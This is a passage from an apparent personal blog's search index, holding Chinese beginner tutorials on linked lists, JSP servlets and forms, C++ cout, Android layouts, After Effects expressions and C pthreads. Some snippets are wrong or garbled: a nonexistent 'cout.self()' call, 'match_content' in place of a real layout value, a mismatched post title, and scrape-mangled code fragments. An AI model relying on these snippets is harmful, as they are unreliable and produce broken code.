position1){</span><br><span class="line">position2 = Random.Range(listMin,listMax);</span><br><span class="line">}</span><br><span class="line">temp             = list[position2];</span><br><span class="line">list[position2] = list[positioin1];</span><br><span class="line">list[position1] = temp;</span><br></pre></td></tr></tbody></table></figure></div><h2 id="对于打乱二维数组，可以生成x1-y1-x2-y2，将这两个位置的数值进行交换"><a href="#对于打乱二维数组，可以生成x1-y1-x2-y2，将这两个位置的数值进行交换" class="headerlink" title="对于打乱二维数组，可以生成x1,y1,x2,y2，将这两个位置的数值进行交换"></a>对于打乱二维数组，可以生成x1,y1,x2,y2，将这两个位置的数值进行交换</h2></body></html>]]></content>
      
      
      <categories>
          
          <category> 计算机理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机理论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构-链表</title>
      <link href="/2019/03/06/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%93%BE%E8%A1%A8/"/>
      <url>/2019/03/06/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="一、链表的代码形式"><a href="#一、链表的代码形式" class="headerlink" title="一、链表的代码形式"></a>一、链表的代码形式</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct Node{</span><br><span class="line">ElementType value;</span><br><span class="line">struct Node * next;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>表示一个Node(节点)包含 一个value和指向下一个的指针。只要在next中赋值地址，便可完成两个节点的连接。</p><p>C语言中如何创建一个节点</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include<stdio.h></stdio.h></span><br><span class="line">struct Node{</span><br><span class="line">ElementType value;</span><br><span class="line">struct Node * next;</span><br><span class="line">}</span><br><span class="line">int main(){</span><br><span class="line">struct Node * root;</span><br><span class="line">root = (struct Node *) malloc( sizeof( struct Node ) );</span><br><span class="line">return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="二、链表的遍历方法"><a href="#二、链表的遍历方法" class="headerlink" title="二、链表的遍历方法"></a>二、链表的遍历方法</h2><p>假设 有一个 struct Node * Root;</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct Node * node = Root;</span><br><span class="line">if(node -> next == NULL){</span><br><span class="line">cout<<node->data<<endl;< span><br><span class="line">}else{</span><br><span class="line">while(node->next != NULL){</span><br><span class="line">node = node->next;</span><br><span class="line">cout<<node->data<<endl;< span><br><span class="line">}</span><br><span class="line">}</span><br></endl;<></node-></span></endl;<></node-></span></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> 计算机理论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机理论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++创建窗口</title>
      <link href="/2019/02/28/C++%E5%88%9B%E5%BB%BA%E7%AA%97%E5%8F%A3/"/>
      <url>/2019/02/28/C++%E5%88%9B%E5%BB%BA%E7%AA%97%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<html><head></head><body></body></html>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSP-servlet详解</title>
      <link href="/2019/02/28/JSP-servlet%E8%AF%A6%E8%A7%A3/"/>
      <url>/2019/02/28/JSP-servlet%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>一、什么是servlet？<br>    处理请求和发送响应的过程是由一种叫做Servlet的程序来完成的，并且Servlet是为了解决实现动态页面而衍生的东西。理解这个的前提是了解一些http协议的东西，并且知道B/S模式(浏览器/服务器)。<br>    B/S:浏览器/服务器。 浏览器通过网址来访问服务器，比如访问百度，在浏览器中输入<code>www.baidu.com</code>，这个时候浏览器就会显示百度的首页，那么这个具体的过程，步骤是怎样的呢？这个就了解一下http请求和响应了　　　　　<br><a href="/2019/02/28/JSP-servlet%E8%AF%A6%E8%A7%A3/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/02/28/JSP-servlet%E8%AF%A6%E8%A7%A3/1.png" class="lazyload"></a>　　　　<br>   请求，响应：通过给的链接应该可以知道这两个具体的内容</p><p>二、tomcat和servlet的关系<br>    Tomcat 是Web应用服务器,是一个Servlet/JSP容器. Tomcat 作为Servlet容器,负责处理客户请求,把请求传送给Servlet,并将Servlet的响应传送回给客户.而Servlet是一种运行在支持Java语言的服务器上的组件. Servlet最常见的用途是扩展Java Web服务器功能,提供非常安全的,可移植的,易于使用的CGI替代品.<br>    从http协议中的请求和响应可以得知，浏览器发出的请求是一个请求文本，而浏览器接收到的也应该是一个响应文本。但是在上面这个图中，并不知道是如何转变的，只知道浏览器发送过来的请求也就是request，我们响应回去的就用response。忽略了其中的细节，现在就来探究一下。<br><a href="/2019/02/28/JSP-servlet%E8%AF%A6%E8%A7%A3/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/02/28/JSP-servlet%E8%AF%A6%E8%A7%A3/2.png" class="lazyload"></a><br>    1：Tomcat将http请求文本接收并解析，然后封装成HttpServletRequest类型的request对象，所有的HTTP头数据读可以通过request对象调用对应的方法查询到。<br>    2：Tomcat同时会要响应的信息封装为HttpServletResponse类型的response对象，通过设置response属性就可以控制要输出到浏览器的内容，然后将response交给tomcat，tomcat就会将其变成响应文本的格式发送给浏览器<br>　<br>    Java Servlet API 是Servlet容器(tomcat)和servlet之间的接口，它定义了serlvet的各种方法，还定义了Servlet容器传送给Servlet的对象类，其中最重要的就是ServletRequest和ServletResponse。所以说我们在编写servlet时，需要实现Servlet接口，按照其规范进行操作。</p><p>三、编写Servlet<br>　　　　在前面，我们已经知道了servlet是什么，为什么需要servlet?（为了实现动态网页，而不是显示静态网页，具体情况可以百度查查），tomcat和servlet的关系？等问题。现在来手动编写一个Servlet。<br>　　　　3.1、手动编写servlet。<br>　　　　　　1、创建一个MyServlet继承HttpServlet，重写doGet和doPost方法，也就是看请求的方式是get还是post，然后用不同的处理方式来处理请求，</p></body></html>]]></content>
      
      
      <categories>
          
          <category> Jsp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Jsp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSP-表单</title>
      <link href="/2019/02/28/JSP-%E8%A1%A8%E5%8D%95/"/>
      <url>/2019/02/28/JSP-%E8%A1%A8%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>我们新建一个jsp文件 (hello.jsp)，在body内写入以下代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><form name="form1" method="post" action="hello_result.jsp"><br><span class="line"><input type="text" name="hello"></span><br><span class="line"><input type="submit" name="提交"></span><br><span class="line"></span></form><br></span></pre></td></tr></tbody></table></figure></div><p>再新建一个hello_result.jsp，在body内写入以下代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><%</span><br><span class="line">request.setCharacterEncoding("utf-8");</span><br><span class="line">String temp = request.getParameter("hello");</span><br><span class="line">out.print(temp);</span><br><span class="line">%></span><br></pre></td></tr></tbody></table></figure></div><p>我们再 hello.jsp 页面输入 Hello World<br>然后会自动跳转到 hello_result.jsp ，并且我们会看到 Hello World 被输出来了</p></body></html>]]></content>
      
      
      <categories>
          
          <category> Jsp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Jsp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSharp-接口</title>
      <link href="/2019/02/21/Java-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2019/02/21/Java-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="正则表达式是十分强大精炼的，可以帮助我们快速判断字符串是否符合某种格式，或查找出字符串的对应字符"><a href="#正则表达式是十分强大精炼的，可以帮助我们快速判断字符串是否符合某种格式，或查找出字符串的对应字符" class="headerlink" title="正则表达式是十分强大精炼的，可以帮助我们快速判断字符串是否符合某种格式，或查找出字符串的对应字符"></a>正则表达式是十分强大精炼的，可以帮助我们快速判断字符串是否符合某种格式，或查找出字符串的对应字符</h1><h1 id="java提供了-Pattern-和-Matcher-类"><a href="#java提供了-Pattern-和-Matcher-类" class="headerlink" title="java提供了 Pattern 和 Matcher 类"></a>java提供了 Pattern 和 Matcher 类</h1><p>Pattern.pattern() 取得 Pattern.compile( regex ) 中的参数 regex</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public class Program1{</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AndroidStudio-界面开发</title>
      <link href="/2019/02/14/AndroidStudio-%E7%95%8C%E9%9D%A2%E5%BC%80%E5%8F%91/"/>
      <url>/2019/02/14/AndroidStudio-%E7%95%8C%E9%9D%A2%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="一、线性界面"><a href="#一、线性界面" class="headerlink" title="一、线性界面"></a>一、线性界面</h1><p>将开头的默认的 Android.support.constraint.ConstraintLayout 改成 LinearLayout<br>这样界面模式便为线性布局<br>          在 LinearLayout 中设置android:orientation:”vertical” 表示垂直线性排列<br>本质上来说，LinearLayout是一种容器</p><h1 id="二、控件ID"><a href="#二、控件ID" class="headerlink" title="二、控件ID"></a>二、控件ID</h1><pre><code>在对应的控件内,输入 android:id="@+id/ID名字" 可以赋予控件ID，例如TextView中，我设置ID tv_content，则只需输入 android:id="@+id/tv_content"</code></pre><h1 id="三、设置控件属性"><a href="#三、设置控件属性" class="headerlink" title="三、设置控件属性"></a>三、设置控件属性</h1><pre><code>宽高：  在对应的控件内，输入 android:layout_width="50dp" ，即可以将控件设置为50dp宽度（单位有：dp mm in pt px sp。一般用dp），或者输入 "wrap_content" 自适应宽度、"match_content" 覆盖父控件，android:layout_height 与上面雷同。背景：  android:background="@android:color/background_dark" 将背景设置为黑色文字位置：   android:gravity="center"</code></pre><p>注意事项：1、图片资源，命名开头不可以是数字</p><p>四、控件事件绑定<br>      首先需要在XML界面文件设置好按钮的ID，然后在OnCreate()函数中输入以下代码，我们假设按钮的ID为 Btn_add<br>      Button Btn_add = findViewById</p></body></html>]]></content>
      
      
      <categories>
          
          <category> AndroidStudio </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AndroidStudio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++_cout详解</title>
      <link href="/2019/02/14/C++_cout%E8%AF%A6%E8%A7%A3/"/>
      <url>/2019/02/14/C++_cout%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h2><h1 id="C-中的cout位于std空间内，是学习C-途中经常用到的功能"><a href="#C-中的cout位于std空间内，是学习C-途中经常用到的功能" class="headerlink" title="C++中的cout位于std空间内，是学习C++途中经常用到的功能"></a>C++中的cout位于std空间内，是学习C++途中经常用到的功能</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include<iostream></iostream></span><br><span class="line">int main() {</span><br><span class="line">int x = 100;</span><br><span class="line">std::cout << "x = " << x << std::endl;</span><br><span class="line">std::cout << "Bin is " << std::dec << x << std::endl;</span><br><span class="line">std::cout << "Oct is " << std::oct << x << std::endl;</span><br><span class="line">std::cout << "Hex is 0x" << std::hex << x << std::endl;</span><br><span class="line">system("pause");</span><br><span class="line">return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><p>执行结果：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = 100</span><br><span class="line">Bin is 100</span><br><span class="line">Oct is 144</span><br><span class="line">Hex is 0x64</span><br></pre></td></tr></tbody></table></figure></div><h2 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h2><h1 id="cout也是一个类，内部有大量的函数可以调用"><a href="#cout也是一个类，内部有大量的函数可以调用" class="headerlink" title="cout也是一个类，内部有大量的函数可以调用"></a>cout也是一个类，内部有大量的函数可以调用</h1><h1 id="cout-put-函数：可以向控制台打印一个字符"><a href="#cout-put-函数：可以向控制台打印一个字符" class="headerlink" title="cout.put()函数：可以向控制台打印一个字符"></a>cout.put()函数：可以向控制台打印一个字符</h1><p>cout.put(int)和cout.put(char)本质相同，就是将参数当做AscII码，然后输出AscII对应的字符<br>即  std::cout.put(‘H’) == std::cout.put(72)</p><h2 id="三、"><a href="#三、" class="headerlink" title="三、"></a>三、</h2><h1 id="通常cout会删除结尾的零。例如，将-3333333-250000-显示为-3333333-25。调用cout-self-将覆盖这种行为，至少在新的实现中是这样的。"><a href="#通常cout会删除结尾的零。例如，将-3333333-250000-显示为-3333333-25。调用cout-self-将覆盖这种行为，至少在新的实现中是这样的。" class="headerlink" title="通常cout会删除结尾的零。例如，将 3333333.250000 显示为 3333333.25。调用cout.self()将覆盖这种行为，至少在新的实现中是这样的。"></a>通常cout会删除结尾的零。例如，将 3333333.250000 显示为 3333333.25。调用cout.self()将覆盖这种行为，至少在新的实现中是这样的。</h1><h1 id="在使用cout之前输入以下代码"><a href="#在使用cout之前输入以下代码" class="headerlink" title="在使用cout之前输入以下代码"></a>在使用cout之前输入以下代码</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cout.self()</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AE-wiggle函数详解</title>
      <link href="/2019/02/10/AE-%E4%BD%8D%E7%BD%AE%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8F%8A%E4%B8%89%E8%A7%92%E5%87%BD%E6%95%B0/"/>
      <url>/2019/02/10/AE-%E4%BD%8D%E7%BD%AE%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8F%8A%E4%B8%89%E8%A7%92%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p><a href="/2019/02/10/AE-%E4%BD%8D%E7%BD%AE%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8F%8A%E4%B8%89%E8%A7%92%E5%87%BD%E6%95%B0/2.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/02/10/AE-%E4%BD%8D%E7%BD%AE%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8F%8A%E4%B8%89%E8%A7%92%E5%87%BD%E6%95%B0/2.jpg" class="lazyload"></a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> AE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高等数学-圆周率的另类求法</title>
      <link href="/2019/01/28/%E6%95%B0%E5%AD%A6-%E5%9C%86%E5%91%A8%E7%8E%87%E7%9A%84%E5%8F%A6%E7%B1%BB%E6%B1%82%E6%B3%95/"/>
      <url>/2019/01/28/%E6%95%B0%E5%AD%A6-%E5%9C%86%E5%91%A8%E7%8E%87%E7%9A%84%E5%8F%A6%E7%B1%BB%E6%B1%82%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p><a href="/2019/01/28/%E6%95%B0%E5%AD%A6-%E5%9C%86%E5%91%A8%E7%8E%87%E7%9A%84%E5%8F%A6%E7%B1%BB%E6%B1%82%E6%B3%95/2.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/01/28/%E6%95%B0%E5%AD%A6-%E5%9C%86%E5%91%A8%E7%8E%87%E7%9A%84%E5%8F%A6%E7%B1%BB%E6%B1%82%E6%B3%95/2.jpg" class="lazyload"></a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> 高等数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 高等数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AE-wiggle函数详解</title>
      <link href="/2019/01/26/AE-wiggle%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/"/>
      <url>/2019/01/26/AE-wiggle%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>函数:</p><ul><li><p>wiggle(freq, amp, octaves = 1, amp_mult = .5, t = time)<br>参数:</p></li><li><p>freq 频率</p></li><li><p>amp 振幅</p></li><li><p>octaves 振幅幅度</p></li><li><p>amp_mult 频率倍频</p></li><li><p>t 持续时间<br>说明:<br>频率和振幅是必须具备的参数其他选填写<br>例如wiggle(50,100)<br>实例:</p></li><li><p>打开AE CS4</p></li><li><p>新建工程</p></li><li><p>新建合成</p></li><li><p>使用文字工具 Ctrl+T 在合成内输入文字</p></li><li><p>给文字层应用动画预设（菜单 - 动画 - 应用动画预设）<br>（..\Adobe\Adobe After Effects CS4\Support Files\Presets\Transform\Separate XYZ Position.ffx）</p></li><li><p>查看控制效果 F3 （XYZ位置分离（）</p></li><li><p>按住ALT键点击该效果Y轴关键贞记录按钮（时钟图标）</p></li><li><p>在表达式处输入:wiggle(50,100)</p></li><li><p>播放,预览效果（这时已经可以看见通过wiggle函数,文字在不停的颤动）</p></li><li><p>给文字层添加效果（表达式控制 - 滑动控制）</p></li><li><p>将（XYZ位置分离）中Y轴上表达式改为<br>str=effect(”滑动控制”)(”滑动”)<br>wiggle(50,str)</p></li><li><p>此时可以通过”滑动控制”中的滑杆控制文字Y轴振动幅度。</p></li><li><p>在”滑动控制”效果中加入关键贞,这样就可以控制wiggle振动幅度了。</p></li></ul></body></html>]]></content>
      
      
      <categories>
          
          <category> AE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言-多线程程序</title>
      <link href="/2019/01/20/C%E8%AF%AD%E8%A8%80-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%A8%8B%E5%BA%8F/"/>
      <url>/2019/01/20/C%E8%AF%AD%E8%A8%80-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="多线程程序在win、mac、linux中的会遇到不同的情况，其中mac和linux的程序不受影响，win可能会出现奇怪的问题。"><a href="#多线程程序在win、mac、linux中的会遇到不同的情况，其中mac和linux的程序不受影响，win可能会出现奇怪的问题。" class="headerlink" title="多线程程序在win、mac、linux中的会遇到不同的情况，其中mac和linux的程序不受影响，win可能会出现奇怪的问题。"></a>多线程程序在win、mac、linux中的会遇到不同的情况，其中mac和linux的程序不受影响，win可能会出现奇怪的问题。</h2><h1 id="gcc编译中需要用"><a href="#gcc编译中需要用" class="headerlink" title="gcc编译中需要用"></a>gcc编译中需要用</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc main.c -lpthread -o main</span><br></pre></td></tr></tbody></table></figure></div><h1 id="lpthread-是-library-pthead，意思是导入pthread的库"><a href="#lpthread-是-library-pthead，意思是导入pthread的库" class="headerlink" title="-lpthread 是 library pthead，意思是导入pthread的库"></a>-lpthread 是 library pthead，意思是导入pthread的库</h1><h1 id="接下来我们来创建一个简单的线程"><a href="#接下来我们来创建一个简单的线程" class="headerlink" title="接下来我们来创建一个简单的线程"></a>接下来我们来创建一个简单的线程</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include<stdlib.h></stdlib.h></span><br><span class="line">#include<pthread.h></pthread.h></span><br><span class="line">#include<stdio.h></stdio.h></span><br><span class="line">void* f1(){</span><br><span class="line">        printf("I'm f1\n");</span><br><span class="line">        return NULL;</span><br><span class="line">}</span><br><span class="line">int main(){</span><br><span class="line">        pthread_t th1;</span><br><span class="line">        pthread_create(&th1,NULL,f1,NULL);</span><br><span class="line">        return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h1 id="运行结果："><a href="#运行结果：" class="headerlink" title="运行结果："></a>运行结果：</h1><h1 id="运行结果什么都没有，这是因为多线程的代码还没有执行的时候，主线程已经执行到-return-0-主线程结束后，其他线程都会结束。"><a href="#运行结果什么都没有，这是因为多线程的代码还没有执行的时候，主线程已经执行到-return-0-主线程结束后，其他线程都会结束。" class="headerlink" title="运行结果什么都没有，这是因为多线程的代码还没有执行的时候，主线程已经执行到 return 0; 主线程结束后，其他线程都会结束。"></a>运行结果什么都没有，这是因为多线程的代码还没有执行的时候，主线程已经执行到 return 0; 主线程结束后，其他线程都会结束。</h1><h1 id="解决方法：我们只需要线程执行完在进行-return-0-即可。"><a href="#解决方法：我们只需要线程执行完在进行-return-0-即可。" class="headerlink" title="解决方法：我们只需要线程执行完在进行 return 0; 即可。"></a>解决方法：我们只需要线程执行完在进行 return 0; 即可。</h1><h1 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a>代码如下：</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include<stdlib.h></stdlib.h></span><br><span class="line">#include<pthread.h></pthread.h></span><br><span class="line">#include<stdio.h></stdio.h></span><br><span class="line">void* f1(){</span><br><span class="line">        printf("I'm f1\n");</span><br><span class="line">        return NULL;</span><br><span class="line">}</span><br><span class="line">int main(){</span><br><span class="line">        pthread_t th1;</span><br><span class="line">        pthread_create(&th1,NULL,f1,NULL);</span><br><span class="line">        pthread_join(th1,NULL);</span><br><span class="line">        return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h1 id="运行结果：I’m-f1"><a href="#运行结果：I’m-f1" class="headerlink" title="运行结果：I’m f1"></a>运行结果：I’m f1</h1><h1 id="可见-pthread-join函数-可以使得线程执行完毕后，在执行下一条代码"><a href="#可见-pthread-join函数-可以使得线程执行完毕后，在执行下一条代码" class="headerlink" title="可见 pthread_join函数 可以使得线程执行完毕后，在执行下一条代码"></a>可见 pthread_join函数 可以使得线程执行完毕后，在执行下一条代码</h1><h2 id="下面我们来一起练习题"><a href="#下面我们来一起练习题" class="headerlink" title="下面我们来一起练习题"></a>下面我们来一起练习题</h2><h1 id="给你一个-int-数组，大小为10000，然后对其进行累加，输出累加结果，要求速度比遍历数组快"><a href="#给你一个-int-数组，大小为10000，然后对其进行累加，输出累加结果，要求速度比遍历数组快" class="headerlink" title="给你一个 int 数组，大小为10000，然后对其进行累加，输出累加结果，要求速度比遍历数组快"></a>给你一个 int 数组，大小为10000，然后对其进行累加，输出累加结果，要求速度比遍历数组快</h1><h1 id="思路：我们可以将10000的大小分成两份，5000交给一个CPU核心处理，5000交给另一个CPU核心处理，这样理论上速度比直接遍历会提升一倍。"><a href="#思路：我们可以将10000的大小分成两份，5000交给一个CPU核心处理，5000交给另一个CPU核心处理，这样理论上速度比直接遍历会提升一倍。" class="headerlink" title="思路：我们可以将10000的大小分成两份，5000交给一个CPU核心处理，5000交给另一个CPU核心处理，这样理论上速度比直接遍历会提升一倍。"></a>思路：我们可以将10000的大小分成两份，5000交给一个CPU核心处理，5000交给另一个CPU核心处理，这样理论上速度比直接遍历会提升一倍。</h1><h1 id="代码如下：-1"><a href="#代码如下：-1" class="headerlink" title="代码如下："></a>代码如下：</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#include<stdlib.h></stdlib.h></span><br><span class="line">#include<pthread.h></pthread.h></span><br><span class="line">#include<stdio.h></stdio.h></span><br><span class="line">int arr[10000];</span><br><span class="line">typedef struct{</span><br><span class="line">int Min;</span><br><span class="line">int Max;</span><br><span class="line">int sum;</span><br><span class="line">}Data;</span><br><span class="line">void* sum(void* args){</span><br><span class="line">int i = 0;</span><br><span class="line">Data* p_data = (Data*)args;</span><br><span class="line">for(i = p_data->Min;i<p_data->Max;i++){</p_data-></span><br><span class="line">p_data->sum += arr[i];</span><br><span 